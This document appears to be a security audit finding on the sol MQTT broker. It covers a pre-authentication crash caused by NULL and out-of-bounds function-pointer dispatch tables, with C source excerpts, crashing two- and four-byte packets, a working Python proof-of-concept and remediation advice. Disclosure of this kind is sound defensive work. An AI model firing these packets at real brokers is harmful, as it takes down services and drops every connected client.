# Pre-auth remote process kill via NULL dispatch on unimplemented MQTT packet types (`handlers[]` / `unpack_handlers[]`)

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-11-17 10:14:02 UTC
**Target:** sol MQTT v3.1.1 broker (C source snapshot, `src/`)
**Endpoint:** MQTT TCP listener — packet framing `recv_packet`, dispatch `process_message` / `mqtt_unpack`
**Method:** MQTT (raw TCP)
**CWE:** CWE-476
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

Any unauthenticated TCP peer can terminate the `sol` broker with a single two-byte MQTT packet. The broker's fixed-header opcode gate admits every type from CONNECT (1) to DISCONNECT (14), but the command dispatch table has NULL entries for the packet types it does not implement, and the dispatch entry point calls the table slot without a NULL check. Sending PINGRESP (`D0 00`) therefore performs an indirect call to address 0. A parallel defect exists in the decoder table, which has only 11 entries, so UNSUBACK (type 11) indexes out of bounds while CONNACK (2) and SUBACK (9) call NULL unpack handlers.

## Impact

**Unauthenticated, zero-interaction availability loss for the whole broker process.** A single two-byte packet sent on a fresh TCP connection — no CONNECT, no credentials, no prior state — terminates the listening daemon (SIGSEGV). Every connected client is dropped, in-flight QoS state and the in-memory retained-message store are lost, and the broker stays down until something outside the process restarts it. The same death is reachable from four distinct packet types and through both dispatch tables, so filtering a single opcode does not mitigate it.

No confidentiality or integrity impact is claimed: the crash address is exactly `0x0` and the call target is not attacker-controlled, so no read/write primitive or control-flow influence was demonstrated. The demonstrated effect is process termination only (`C:N` / `I:N` / `A:H`).

## Counterevidence

Looked for a control that would filter these frames before dispatch and found none: the only pre-dispatch validation is the opcode range check at `src/server.c:512` (`DISCONNECT < opcode || CONNECT > opcode`), which passes every type used here; `max_request_size` bounds only the declared Remaining Length; and neither `handle_command` nor `mqtt_unpack` checks the slot before calling it. Decoding and dispatch run before `connect_handler`, so `allow_anonymous`/password configuration does not run first — verified dynamically against a broker with `allow_anonymous false`, which died identically with no credentials supplied. A CONNECT beforehand does not help (verified: same crash after `CONNACK 20 02 00 00`).

The strongest remaining argument against severity is that this is only a crash: the faulting `pc` is exactly `0x0`, `rax` holds the opcode index rather than attacker data, and for type 11 the out-of-bounds slot contains a linker-determined value, so no controlled call target or write primitive was demonstrated. That is why the rating is availability-only. The service itself is not otherwise broken — the control packet `C0 00` is answered correctly on the same build and the same broker instance.

## Confidence Rationale

Reproduced deterministically against both the sanitizer build and the plain optimized build, pre-authentication and post-CONNECT, with an in-band negative control and a rebuilt patch that closes all four cases.

## What Would Change This Severity

Evidence that the broker is the only instance behind the service and has no supervisor or auto-restart would raise this from a transient crash to a sustained outage; conversely, confirmed sub-second automatic restart would lower the practical impact. Evidence that an attacker can influence the contents of the out-of-bounds table slot reached by type 11 would raise it to a control-flow hijack and add integrity impact.

## Technical Analysis

## Attacker-reachable path

`recv_packet` admits any opcode in the CONNECT..DISCONNECT range and never checks whether the broker implements that packet type as an incoming packet:

```c title=src/server.c startLineNumber=505 endLineNumber=523
        if (c->read == 2) {
            opcode = *c->rbuf >> 4;

            /*
             * Check for OPCODE, if an unknown OPCODE is received return an
             * error
             */
            if (DISCONNECT < opcode || CONNECT > opcode)
                return -ERRPACKETERR;

            /*
             * We have a PINGRESP/PINGREQ or a DISCONNECT packet, we're done
             * here
             */
            if (opcode > UNSUBSCRIBE) {
                c->rpos   = 2;
                c->toread = c->read;
                goto exit;
            }
        }
```

Two of the four types of interest (PINGRESP = 13, UNSUBACK = 11) are additionally classified as "no payload" packets, so the frame is accepted after only two bytes are read, with `read == toread == 2`.

`process_message` then decodes and dispatches with no regard for whether the type is legal from a client:

```c title=src/server.c startLineNumber=858 endLineNumber=867
static void process_message(struct ev_ctx *ctx, struct client *c)
{
    struct io_event io = {.client = c};
    /*
     * Unpack received bytes into a mqtt_packet structure and execute the
     * correct handler based on the type of the operation.
     */
    mqtt_unpack(c->rbuf + c->rpos, &io.data, *c->rbuf, c->read - c->rpos);
    c->toread = c->read = c->rpos = 0;
    c->rc = handle_command(io.data.header.bits.type, &io);
```

## Root cause 1 — unchecked command dispatch table

The command handler table is declared with 15 entries and NULL placeholders for CONNACK (2), SUBACK (9), UNSUBACK (11) and PINGRESP (13):

```c title=src/handlers.c startLineNumber=61 endLineNumber=76
/* Command handler mapped usign their position paired with their type */
static handler *handlers[15] = {NULL,
                                connect_handler,
                                NULL,
                                publish_handler,
                                ...
                                NULL,
                                disconnect_handler};
```

and the only public dispatch entry point indexes it and calls the result:

```c title=src/handlers.c startLineNumber=877 endLineNumber=880
int handle_command(unsigned type, struct io_event *event)
{
    return handlers[type](event);
}
```

There is no range check (the opcode is a 4-bit field, so `type == 15` would read one element past a 15-entry table) and no NULL check. `D0 00` consequently performs `call *handlers[13]` with a NULL target: the faulting instruction pointer is exactly `0x0` and `rax` holds the selected index, `0xd`.

## Root cause 2 — out-of-bounds decoder dispatch table

The decoder table has only eleven entries, ending at UNSUBSCRIBE (10):

```c title=src/mqtt.c startLineNumber=68 endLineNumber=82
/*
 * Unpack functions mapping unpacking_handlers positioned in the array based
 * on message type
 */
static mqtt_unpack_handler *unpack_handlers[11] = {NULL,
                                                   unpack_mqtt_connect,
                                                   NULL,
                                                   unpack_mqtt_publish,
                                                   unpack_mqtt_ack,
                                                   ...
                                                   unpack_mqtt_unsubscribe};
```

`mqtt_unpack` only short-circuits types 12..14, so UNSUBACK (11) is used as an index into that 11-element array — an out-of-bounds read of a function pointer that is then called — while CONNACK (2) and SUBACK (9) call the NULL slots:

```c title=src/mqtt.c startLineNumber=422 endLineNumber=437
int mqtt_unpack(u8 *buf, struct mqtt_packet *pkt, u8 byte, usize len)
{

    int rc      = MQTT_OK;
    u8 type     = byte >> 4;

    pkt->header = (union mqtt_header){.byte = byte};

    /* Call the appropriate unpack handler based on the message type */
    if (type >= PINGREQ && type <= DISCONNECT)
        return rc;

    rc = unpack_handlers[type](buf, pkt, len);

    return rc;
}
```

## Reachability and preconditions

None beyond the ability to open a TCP connection. Decoding and dispatch both run inside `process_message` before `connect_handler` evaluates `allow_anonymous` or any credential, so the flaw is reachable with `allow_anonymous false` and no CONNECT at all (verified). The packet also works after a successful CONNECT, so authenticating does not protect against it.

The two dispatch layers have to be fixed together: rejecting only type 11 leaves types 2, 9 and 13 live, and fixing only the decoder leaves the `handlers[]` holes reachable through the types the decoder does not unpack (the PINGREQ/DISCONNECT paths and, for type 13, the short-packet path).

## Proof of Concept

1. Start the `sol` broker on a loopback port from the ASan/UBSan build (`build-asan/sol`) or the plain optimized build (`build-dev/sol`).
2. Open a TCP connection to the listener and send the two bytes `D0 00` (fixed header: type 13 PINGRESP, flags 0; Remaining Length 0). Do not send a CONNECT first.
3. Observe the connection close without a reply.
4. Observe the broker terminate: AddressSanitizer reports `SEGV on unknown address 0x000000000000 (pc 0x000000000000)` with the top frame in `process_message` (`src/server.c:867`); the non-instrumented build dies with signal 11.
5. Repeat with `B0 00` (UNSUBACK, type 11) to reach the out-of-bounds decoder table entry, and with `90 00 00 00` (SUBACK, type 9) and `20 00 00 00` (CONNACK, type 2) to reach NULL decoder slots; each terminates the broker.
6. Control: repeat with `C0 00` (PINGREQ, type 12) — the broker answers `D0 00` and keeps serving.
7. Repeat step 2 against a broker started with `allow_anonymous false` without supplying any credentials, to confirm the packet is processed before authentication.
8. Apply the patch, rebuild, and repeat steps 2, 5 and 6: every case now closes only the offending connection and the broker stays up.

```python
"""Reproduce the NULL dispatch crash in the sol broker.

Starts a private broker, fires one raw MQTT fixed header at it, then reports the
process termination status. Cases:
  d0 00        PINGRESP (type 13) -> handlers[13] == NULL          crash
  b0 00        UNSUBACK (type 11) -> unpack_handlers[11] out of bounds  crash
  90 00 00 00  SUBACK  (type 9)   -> unpack_handlers[9] NULL       crash
  20 00 00 00  CONNACK (type 2)   -> unpack_handlers[2] NULL       crash
  c0 00        PINGREQ (type 12)  -> negative control, answered d0 00
"""
import os
import socket
import subprocess
import tempfile
import time

BIN = "/path/to/sol"
PORT = 1883

CONF = """ip_address 127.0.0.1
ip_port {port}
log_level DEBUG
log_path {dir}/sol.log
max_memory 512MB
max_request_size 1MB
tcp_backlog 128
stats_publish_interval 60s
allow_anonymous true
"""

# CONNECT, clean_session=1, keepalive 60, client id "probe-client"
CONNECT_BODY = bytes.fromhex("00044d5154540402003c000c") + b"probe-client"
CONNECT = bytes([0x10, len(CONNECT_BODY)]) + CONNECT_BODY


def start(binary, port):
    workdir = tempfile.mkdtemp(prefix="sol-broker-")
    conf = os.path.join(workdir, "sol.conf")
    with open(conf, "w") as fh:
        fh.write(CONF.format(port=port, dir=workdir))
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "abort_on_error=1:detect_leaks=0:log_path=%s/report" % workdir
    env["UBSAN_OPTIONS"] = "halt_on_error=1:print_stacktrace=1:log_path=%s/report" % workdir
    proc = subprocess.Popen([binary, "-c", conf], env=env, cwd=workdir,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(160):
        try:
            socket.create_connection(("127.0.0.1", port), timeout=0.3).close()
            return proc, workdir
        except OSError:
            time.sleep(0.05)
    raise SystemExit("broker did not start")


def fire(payload, port, preconnect):
    sock = socket.create_connection(("127.0.0.1", port), timeout=3)
    sock.settimeout(2)
    if preconnect:
        sock.sendall(CONNECT)
        print("    CONNACK: %s" % sock.recv(8).hex(" "))
    sock.sendall(payload)
    try:
        reply = sock.recv(64)
        print("    sent %s -> reply %s"
              % (payload.hex(" "), reply.hex(" ") or "<peer closed>"))
    except socket.timeout:
        print("    sent %s -> reply <none>" % payload.hex(" "))
    except ConnectionResetError:
        print("    sent %s -> reply <reset>" % payload.hex(" "))
    sock.close()


CASES = [("d0 00", False), ("b0 00", False), ("90 00 00 00", False),
         ("20 00 00 00", False), ("c0 00", False), ("d0 00", True)]

for hexpkt, preconnect in CASES:
    proc, workdir = start(BIN, PORT)
    print("[*] case %s preconnect=%s" % (hexpkt, preconnect))
    fire(bytes.fromhex(hexpkt), PORT, preconnect)
    time.sleep(1.0)
    rc = proc.poll()
    print("    broker %s" % ("ALIVE" if rc is None
                             else "terminated rc=%r" % (rc,)))
    if rc is None:
        proc.terminate()
    for name in sorted(os.listdir(workdir)):
        if name.startswith("report"):
            with open(os.path.join(workdir, name), errors="replace") as fh:
                print(fh.read())
```

## Remediation

Reject packet types the broker does not implement before they reach any dispatch table, and make both dispatch sites defensive. Concretely: introduce a single predicate that enumerates the packet types a client may send (CONNECT, PUBLISH, PUBACK, PUBREC, PUBREL, PUBCOMP, SUBSCRIBE, UNSUBSCRIBE, PINGREQ, DISCONNECT) and call it from the framing gate so CONNACK, SUBACK, UNSUBACK, PINGRESP and the reserved opcodes are rejected with a protocol error and the connection closed. Size both the decoder and the command handler tables for the whole 4-bit opcode space (16 entries) with an explicit, commented slot per type so a missing entry is deliberate rather than accidental, and make both lookup sites bound the index and treat a NULL entry as a protocol error instead of calling through it. As defence in depth, consider having the decoder return an error that the caller acts on, rather than ignoring the decode result, so a future table gap cannot silently fall through to a handler that was never designed to run for that packet type.

## Assumptions

The broker is reachable over TCP by the attacker, which is its normal deployment mode (the shipped config binds a TCP port; `allow_anonymous` defaults to true). No credentials, prior CONNECT, or client state are required. A single broker process serves the listener, so killing it drops all clients.
